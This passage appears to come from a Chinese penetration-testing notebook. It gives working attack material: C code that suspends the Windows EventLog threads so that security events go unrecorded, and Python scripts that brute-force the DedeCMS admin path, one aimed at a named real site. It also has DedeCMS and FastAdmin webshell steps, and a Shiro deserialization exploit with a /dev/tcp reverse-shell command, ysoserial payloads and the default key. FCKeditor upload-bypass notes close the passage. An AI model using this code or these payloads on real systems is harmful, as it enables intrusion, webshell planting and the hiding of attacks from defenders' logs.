<p><img src="818.png" alt="image"></p>
<pre><code>下面显示的是，确实，暂停足以使EventLog服务无法注册任何新事件：
没有挂起时修改个密码
</code></pre>
<p><img src="819.png" alt="image"></p>
<pre><code>会注册新的事件
挂起时则没有新的事件
</code></pre>
<p><img src="820.png" alt="image"></p>
<pre><code>代码实现
下面是在较高级别下工作的技术代码：
1.使用OpenSCManagerA命令打开服务控制管理器的句柄 
2.使用OpenServiceA命令打开EventLog服务的句柄 
3.使用QueryServiceStatusEx命令检索svchost.exe（托管EventLog）进程ID
4.打开svchost.exe进程的句柄（从第3步开始）
5.获取由svchost.exe加载的已加载模块的列表 EnumProcessModules
6.循环浏览在步骤5中检索到的已加载模块列表，使用查找其名称并找到模块的基地址-这是包含服务内部工作的模块
7.获取模块信息。它将返回带有模块的起始地址-我们稍后将在确定服务线程是否落入wevtsvc.dll模块的内存空间时需要这些详细信息wevtsvc.dll   GetModuleInformation EventLog
8.枚举svchost.exe内的所有线程。Thread32FirstThread32Next
9.对于步骤8中的每个线程，使用NtQueryInformationThread命令检索线程的起始地址 
10.对于步骤8中的每个线程，检查线程的起始地址是否属于svchost.exe内部的内存空间。wevtsvc.dll
11.如果线程的起始地址在内存空间内，则这是我们的目标线程，我们将其挂起wevtsvc.dll SuspendThread
12.EventLog 服务现已禁用
</code></pre>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dbghelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;DbgHelp&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> myNtQueryInformationThread = NTSTATUS(NTAPI*)(</span><br><span class="line">IN HANDLE ThreadHandle,</span><br><span class="line">IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">OUT PVOID ThreadInformation,</span><br><span class="line">IN ULONG ThreadInformationLength,</span><br><span class="line">OUT PULONG ReturnLength</span><br><span class="line">);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE serviceProcessHandle;</span><br><span class="line">HANDLE snapshotHandle;</span><br><span class="line">HANDLE threadHandle;</span><br><span class="line">HMODULE modules[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">SIZE_T modulesSize = <span class="keyword">sizeof</span>(modules);</span><br><span class="line">DWORD modulesSizeNeeded = <span class="number">0</span>;</span><br><span class="line">DWORD moduleNameSize = <span class="number">0</span>;</span><br><span class="line">SIZE_T modulesCount = <span class="number">0</span>;</span><br><span class="line">WCHAR remoteModuleName[<span class="number">128</span>] = &#123;&#125;;</span><br><span class="line">HMODULE serviceModule = <span class="literal">NULL</span>;</span><br><span class="line">MODULEINFO serviceModuleInfo = &#123;&#125;;</span><br><span class="line">DWORD_PTR threadStartAddress = <span class="number">0</span>;</span><br><span class="line">DWORD bytesNeeded = <span class="number">0</span>;</span><br><span class="line">myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtQueryInformationThread&quot;</span>));</span><br><span class="line">THREADENTRY32 threadEntry;</span><br><span class="line">threadEntry.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">SC_HANDLE sc = OpenSCManagerA(<span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, MAXIMUM_ALLOWED);</span><br><span class="line">SC_HANDLE service = OpenServiceA(sc, <span class="string">&quot;EventLog&quot;</span>, MAXIMUM_ALLOWED);</span><br><span class="line">SERVICE_STATUS_PROCESS serviceStatusProcess = &#123;&#125;;</span><br><span class="line"># Get PID of svchost.exe that hosts EventLog service</span><br><span class="line">QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&amp;serviceStatusProcess, <span class="keyword">sizeof</span>(serviceStatusProcess), &amp;bytesNeeded);</span><br><span class="line">DWORD servicePID = serviceStatusProcess.dwProcessId;</span><br><span class="line"># Open handle to the svchost.exe</span><br><span class="line">serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);</span><br><span class="line">snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"># Get a <span class="built_in">list</span> of modules loaded by svchost.exe</span><br><span class="line">EnumProcessModules(serviceProcessHandle, modules, modulesSize, &amp;modulesSizeNeeded);</span><br><span class="line">modulesCount = modulesSizeNeeded / <span class="keyword">sizeof</span>(HMODULE);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; modulesCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">serviceModule = modules[i];</span><br><span class="line"># Get loaded <span class="keyword">module</span><span class="number">&#x27;</span>s name</span><br><span class="line">GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, <span class="keyword">sizeof</span>(remoteModuleName));</span><br><span class="line"><span class="keyword">if</span> (wcscmp(remoteModuleName, <span class="string">L&quot;wevtsvc.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Windows EventLog module %S at %p\n\n&quot;</span>, remoteModuleName, serviceModule);</span><br><span class="line">GetModuleInformation(serviceProcessHandle, serviceModule, &amp;serviceModuleInfo, <span class="keyword">sizeof</span>(MODULEINFO));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"># Enumerate threads</span><br><span class="line">Thread32First(snapshotHandle, &amp;threadEntry);</span><br><span class="line"><span class="keyword">while</span> (Thread32Next(snapshotHandle, &amp;threadEntry))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (threadEntry.th32OwnerProcessID == servicePID)</span><br><span class="line">&#123;</span><br><span class="line">threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);</span><br><span class="line">NtQueryInformationThread(threadHandle, (THREADINFOCLASS)<span class="number">0x9</span>, &amp;threadStartAddress, <span class="keyword">sizeof</span>(DWORD_PTR), <span class="literal">NULL</span>);</span><br><span class="line"># Check <span class="keyword">if</span> thread<span class="number">&#x27;</span>s start address is inside wevtsvc.dll memory range</span><br><span class="line"><span class="keyword">if</span> (threadStartAddress &gt;= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll &amp;&amp; threadStartAddress &lt;= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Suspending EventLog thread %d with start address %p\n&quot;</span>, threadEntry.th32ThreadID, threadStartAddress);</span><br><span class="line"># Suspend EventLog service thread</span><br><span class="line">SuspendThread(threadHandle);</span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>以下演示
net user ola ola执行并更改用户的ola密码，并在6:55:30 PM记录事件4724
</code></pre>
<p><img src="821.png" alt="image"><br><img src="822.png" alt="image"></p>
<pre><code>执行文件，svchost.exe中暂停了4个EventLog线程
</code></pre>
<p><img src="823.png" alt="image"><br><img src="824.png" alt="image"></p>
<pre><code>再次执行修改密码命令
</code></pre>
<p><img src="825.png" alt="image"><br><img src="826.png" alt="image"></p>
<pre><code>新的事件没有写入，只有挂起前的事件
</code></pre>
<p><img src="827.png" alt="image"></p>
<h2 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h2><h3 id="爆破后台"><a href="#爆破后台" class="headerlink" title="爆破后台"></a>爆破后台</h3><pre><code>windows服务器
tags.php
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">characters = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;</span></span><br><span class="line">back_dir = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">url = <span class="string">&quot;http://www.test.com/tags.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span> : <span class="string">&quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_FILES[mochazz][name]&quot;</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;_FILES[mochazz][size]&quot;</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;_FILES[mochazz][type]&quot;</span> : <span class="string">&quot;image/gif&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> pre <span class="keyword">in</span> itertools.permutations(characters,num):</span><br><span class="line">        pre = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(pre))</span><br><span class="line">        data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>].<span class="built_in">format</span>(p=pre)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;testing&quot;</span>,pre)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Upload filetype not allow !&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            back_dir = pre</span><br><span class="line">            data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = <span class="string">&quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = <span class="string">&quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 前缀为：&quot;</span>,back_dir)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> characters:</span><br><span class="line">        <span class="keyword">if</span> ch == characters[-<span class="number">1</span>]:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>].<span class="built_in">format</span>(p=back_dir+ch)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Upload filetype not allow !&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            back_dir += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span>,back_dir)</span><br><span class="line">            data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = <span class="string">&quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[<span class="string">&quot;_FILES[mochazz][tmp_name]&quot;</span>] = <span class="string">&quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;后台地址为：&quot;</span>,back_dir)</span><br></pre></td></tr></table></figure>
<pre><code>rss.php
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_-&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">        data = <span class="string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=../%s%s&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>% (menu, payload)</span><br><span class="line">        res = requests.post(<span class="string">&quot;http://www.yx-tv.com/plus/rss.php&quot;</span>, data=data, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>).find(<span class="string">&quot;Error&quot;</span>) &gt; -<span class="number">1</span>:</span><br><span class="line">            menu += payload</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> payload == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line"><span class="built_in">print</span>(menu)</span><br></pre></td></tr></table></figure>
<h3 id="dedecms前台重置任意管理员密码"><a href="#dedecms前台重置任意管理员密码" class="headerlink" title="dedecms前台重置任意管理员密码"></a>dedecms前台重置任意管理员密码</h3><pre><code>https://xz.aliyun.com/t/1959
</code></pre>
<h3 id="伪造cookie登录任意前台用户"><a href="#伪造cookie登录任意前台用户" class="headerlink" title="伪造cookie登录任意前台用户"></a>伪造cookie登录任意前台用户</h3><pre><code>注册用户user1
访问
/member/index.php?uid=user1
登录user1
将last_vid的值赋给DedeUserID，last_vidckMd5的值赋给DedeUserIDckMd5修改后的cookie
</code></pre>
<h3 id="前台上传shell"><a href="#前台上传shell" class="headerlink" title="前台上传shell"></a>前台上传shell</h3><pre><code>Admin登录，发表文章，修改文件名1.jpg.p*hp
后台文件上传
访问/dede/tpl.php?action=upload
F12获取token
访问
/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[token值]
/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=6d0c1893e01a77e7e6ba24fb2dc7599c
Shell位置/include/taglib/moonsec.lib.php
</code></pre>
<h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><pre><code>模块-&gt;广告管理-&gt;新建广告，在广告内容中添加一句话
/plus/ad_js.php?aid=[x]
</code></pre>
<h2 id="FastAdmin前台getshell"><a href="#FastAdmin前台getshell" class="headerlink" title="FastAdmin前台getshell"></a>FastAdmin前台getshell</h2><pre><code>前台创建用户，修改头像，传图片马
/public/index/user/_empty?name=../../public/uploads/20200926/4a91d432904c0042bcd038ea96ad4947.jpg
</code></pre>
<h2 id="Shiro-rememberMe反序列化漏洞"><a href="#Shiro-rememberMe反序列化漏洞" class="headerlink" title="Shiro rememberMe反序列化漏洞"></a>Shiro rememberMe反序列化漏洞</h2><pre><code>Shiro相关转自bypass公众号
https://github.com/insightglacier/Shiro_exploit
python shiro_exploit.py -u http://192.168.172.129:8080
</code></pre>
<p><img src="828.png" alt="image"></p>
<pre><code>通过获取到的key，常见的漏洞利用方式有两种：反弹shell和写入文件。
反弹shell
监听本地端口
nc -lvp 1234
Java Runtime 配合 bash 编码，在线编码地址：
http://www.jackson-t.ca/runtime-exec-payloads.html
将bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1编码
bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;
使用shiro.py 生成Payload
python shiro.py 192.168.172.133:6666
</code></pre>
<p><img src="829.png" alt="image"></p>
<pre><code>shiro.py代码如下
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)    </span><br><span class="line">BS = AES.block_size    </span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()    </span><br><span class="line">key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)    </span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span>    </span><br><span class="line">encryptor = AES.new(key, AES.MODE_CBC, iv)    </span><br><span class="line">file_body = pad(popen.stdout.read())    </span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    </span><br><span class="line"><span class="keyword">return</span> base64_ciphertext</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br></pre></td></tr></table></figure>
<pre><code>构造数据包，伪造cookie，发送Payload。
</code></pre>
<p><img src="830.png" alt="image"><br><img src="831.png" alt="image"></p>
<pre><code>写入文件
生成poc.ser文件
sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser
使用Shiro内置的默认密钥对Payload进行加密：
</code></pre>
<p><img src="832.png" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;d://poc.ser&quot;</span>));</span><br><span class="line">        	AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);        System.out.printf(ciphertext.toString());    &#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="833.png" alt="image"><br><img src="834.png" alt="image"></p>
<h2 id="Shiro-Padding-Oracle-Attack"><a href="#Shiro-Padding-Oracle-Attack" class="headerlink" title="Shiro Padding Oracle Attack"></a>Shiro Padding Oracle Attack</h2><pre><code>登录Shiro网站，从cookie中获得rememberMe字段的值
</code></pre>
<p><img src="835.png" alt="image"></p>
<pre><code>利用DNSlog探测，通过ysoserial工具payload。
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class
使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。
java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath
https://github.com/longofo/PaddingOracleAttack-Shiro-721
</code></pre>
<p><img src="836.png" alt="image"><br><img src="837.png" alt="image"></p>
<pre><code>使用构造的rememberMe攻击字符串重新请求网站
</code></pre>
<p><img src="838.png" alt="image"><br><img src="839.png" alt="image"></p>
<pre><code>一键自动化漏洞利用工具
https://github.com/feihong-cs/ShiroExploit
</code></pre>
<h2 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h2><pre><code>/;/test/admin/page
</code></pre>
<h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><pre><code>版本
FCKeditor/_whatsnew.html
编辑器
FCKeditor/_samples/default.html
FCKeditor/_samples/default.html
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
fckeditor/editor/filemanager/connectors/test.html
上传
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html
上传路径
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor被动限制策略所导致的过滤不严问题
影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3
脆弱描述：FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtmFckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件
上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个.来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。攻击利用:
允许其他任何后缀上传
利用2003路径解析漏洞上传木马
影响版本: 索引底部附录B
脆弱描述：
利用2003系统路径解析漏洞的原理，创建类似bin.asp如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。
攻击利用:
fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp
强制建立shell.asp目录：
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684
or
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp
FCKeditor PHP上传任意文件漏洞
影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2
脆弱描述：FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。
成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：
&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;
&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;
&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;
&lt;/form&gt;
Note:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。
FCKeditor 暴路径漏洞
影响版本：aspx版FCKeditor
攻击利用：
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/1.asp
FCKeditor 文件上传“.”变“_”下划线的绕过方法
影响版本: FCKeditor =&gt; 2.4.x
脆弱描述：我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。攻击利用:
提交1.php+空格 就可以绕过去所有的,
※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]Note:http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html
FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）
影响版本:=&gt;2.4.x的最新版已修补脆弱描述:由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。上传第一次。被过滤为123_asp;123.jpg 从而无法运行。
但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。
文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。
所以。IIS6的漏洞继续执行了。如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：
1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。
2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。
3.FCKeditor的这个漏洞已经被修复。
FCKeditor 新闻组件遍历目录漏洞
影响版本:Aspx与JSP版FCKeditor脆弱描述：如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”
攻击利用:
修改CurrentFolder参数使用 ../../来进入不同的目录
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=aspx.asp
根据返回的XML信息可以查看网站所有的目录。
/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F
/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F
TYPE自定义变量任意上传文件漏洞
影响版本: 较早版本
脆弱描述：通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。攻击利用:
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp
打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:
http://www.xxxx.com/UserFiles/all/1.asp
Type=all 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.比如输入:
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&amp;Connector=connectors/asp/connector.asp
网马就可以传到网站的根目录下.Note:如找不到默认上传文件夹可检查此文件:
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
</code></pre>
<h3 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h3><pre><code>eWebEditor 基础知识
默认后台地址：
/ewebeditor/admin_login.asp
/WebEdior/admin/login.aspx
建议最好检测下admin_style.asp文件是否可以直接访问默认数据库路径：
[PATH]/db/ewebeditor.mdb
[PATH]/db/db.mdb
[PATH]/db/%23ewebeditor.mdb
默认密码：
